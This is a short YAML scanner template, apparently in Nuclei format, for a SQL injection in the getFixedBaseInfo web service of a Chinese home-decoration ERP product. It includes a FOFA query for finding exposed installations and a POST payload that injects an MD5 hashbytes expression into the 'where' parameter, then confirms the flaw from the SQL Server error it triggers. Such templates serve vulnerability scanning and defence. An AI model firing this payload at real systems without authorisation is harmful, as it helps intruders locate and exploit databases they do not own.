id: poc-yaml-znfit-erp-ms-getfixedbaseinfo-sqli
info:
  name: 家装ERP管理系统 getFixedBaseInfo SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 家装ERP管理系统
    fofa: body="上海装盟信息科技有限公司"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

flow: http(1) && http(2)

http:
  - id: "initial-check"
    method: GET
    path:
      - "{{BaseURL}}/main/login.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "上海装盟信息科技有限公司"

  - id: "sqli-check"
    method: POST
    path:
      - "{{BaseURL}}/WEB_SERVICE/Budget.asmx/getFixedBaseInfo"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      where=1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))&intPageIndex=1&pageSize=20
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
